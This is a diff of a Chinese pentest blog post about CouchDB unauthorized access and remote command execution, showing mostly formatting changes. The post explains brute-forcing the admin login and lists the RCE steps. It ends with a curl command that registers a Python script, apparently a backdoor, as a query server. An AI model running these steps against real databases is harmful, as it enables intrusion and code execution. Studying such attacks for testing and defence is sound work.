@@ -7,25 +7,27 @@ categories: [Pentest, Database, Remote Command Execution, CouchDB]
 ---
 
 
-## 背景介绍
+### 背景介绍
  CouchDB是一个开源的面向文档的数据库管理系统，可以通过 RESTful JavaScript Object Notation (JSON) API 访问。CouchDB可以安装在大部分POSIX系统上，包括Linux和Mac OS X。
 
-## 漏洞介绍
+### 漏洞介绍
 Couchdb默认会在5984端口开放Restful的API接口，如果使用SSL的话就会监听在6984端口，用于数据库的管理功能。其HTTP Server默认开启时没有进行验证，而且绑定在0.0.0.0，所有用户均可通过API访问导致未授权访问。
 
 使用nmap扫描可发现couchdb的banner信息
 ![couchdb默认端口](https://urahara3389.github.io/static/img/posts/CouchDB/Couchdb-RCE-nmap.png)
 
->执行命令需要使用admin权限，如果数据库存在未授权则可直接利用，若有账号认证则需要想办法获取admin的密码，当然可通过burpsuit去爆破/_utils/，也可以通过metasploit中的auxiliary/scanner/Couchdb/Couchdb/Couchdb/Couchdb_login模块直接进行爆破
->CouchDB提供了一个可视化界面工具，在浏览器中运行“http://127.0.0.1:5984/_utils/”，即可见到如下所示的界面。
->![账号认证](https://urahara3389.github.io/static/img/posts/CouchDB/Couchdb-RCE-admin.png)
-## 漏洞利用
+执行命令需要使用admin权限，如果数据库存在未授权则可直接利用，若有账号认证则需要想办法获取admin的密码，当然可通过burpsuit去爆破/_utils/，也可以通过metasploit中的auxiliary/scanner/Couchdb/Couchdb/Couchdb/Couchdb_login模块直接进行爆破
+CouchDB提供了一个可视化界面工具，在浏览器中运行“http://127.0.0.1:5984/_utils/”，即可见到如下所示的界面。
+![账号认证](https://urahara3389.github.io/static/img/posts/CouchDB/Couchdb-RCE-admin.png)
+### 漏洞利用
 这里举例有账号认证的情况，我们需要使用admin身份登录然后获取cookie，再使用curl命令与api进行交互，实现数据库操作
 ![获取Cookie](https://urahara3389.github.io/static/img/posts/CouchDB/Couchdb-RCE-cookie.png)
->远程命令执行示例
-1. 新增query_server配置，写入要执行的命令；
-2. 新建一个临时库和临时表，插入一条记录；
-3. 调用query_server处理数据
+
+远程命令执行示例
+
+>1. 新增query_server配置，写入要执行的命令；
+>2. 新建一个临时库和临时表，插入一条记录；
+>3. 调用query_server处理数据
 
 ```bash
 curl -X PUT 'http://192.168.199.181:5984/_config/query_servers/cmd' -d '"python /tmp/back.py"'  -H "Cookie: AuthSession=YWRtaW46NTc5QTRGMjc6VKTKwNEud9fFchzR-HtOrjM5Cg4"
